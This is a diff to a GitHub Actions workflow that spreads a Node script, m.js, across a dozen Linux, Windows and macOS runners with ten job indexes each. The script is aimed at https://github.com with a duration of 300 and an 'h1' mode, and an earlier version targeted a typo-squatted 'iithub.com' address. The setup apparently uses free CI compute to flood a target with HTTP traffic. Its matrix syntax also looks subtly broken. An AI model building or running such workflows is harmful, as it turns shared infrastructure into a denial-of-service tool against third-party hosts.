@@ -1,4 +1,4 @@
-name: Run Parallel Jobs
+name: Run Parallel Jobs - All OS Types
 on:
   workflow_dispatch:  # Allows manual triggering
   push:
@@ -8,16 +8,45 @@ on:
 
 jobs:
   parallel-execution:
-    runs-on: ${{ matrix.os }}
+    runs-on: ${{ matrix.runner }}
     strategy:
       matrix:
-        os:
-          - ubuntu-20.04     # Ubuntu 20.04
-          - ubuntu-22.04     # Ubuntu 22.04
-          - windows-2019      # Windows Server 2019
-          - windows-2022      # Windows Server 2022
-          - macos-latest      # Latest macOS
-        node-index: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]  # 10 parallel jobs per OS
+        include:
+          # Linux x64
+          - runner: ubuntu-latest
+            node-index: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]
+          - runner: ubuntu-24.04
+            node-index: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]
+          - runner: ubuntu-22.04
+            node-index: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]
+          
+          # Linux ARM64
+          - runner: ubuntu-24.04-arm
+            node-index: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]
+          - runner: ubuntu-22.04-arm
+            node-index: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]
+          
+          # Windows x64
+          - runner: windows-latest
+            node-index: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]
+          - runner: windows-2025
+            node-index: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]
+          - runner: windows-2022
+            node-index: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]
+          
+          # Windows ARM64
+          - runner: windows-11-arm
+            node-index: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]
+          
+          # macOS Intel
+          - runner: macos-13
+            node-index: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]
+          - runner: macos-15-intel
+            node-index: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]
+          
+          # Linux Slim
+          - runner: ubuntu-slim
+            node-index: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]
 
     steps:
       - name: Checkout code
@@ -26,7 +55,7 @@ jobs:
       - name: Setup Node.js
         uses: actions/setup-node@v4
         with:
-          node-version: '18'
+          node-version: '20'
           
       - name: Install dependencies
         run: |
@@ -34,4 +63,4 @@ jobs:
           
       - name: Run Node script with parameters
         run: |
-          node m.js https://iithub.com/vrbrh921-glitch/Bdbs/edit/main/.github/workflows/main.yml 300 ${{ matrix.node-index }} h1
+          node m.js https://github.com 300 ${{ matrix.node-index }} h1
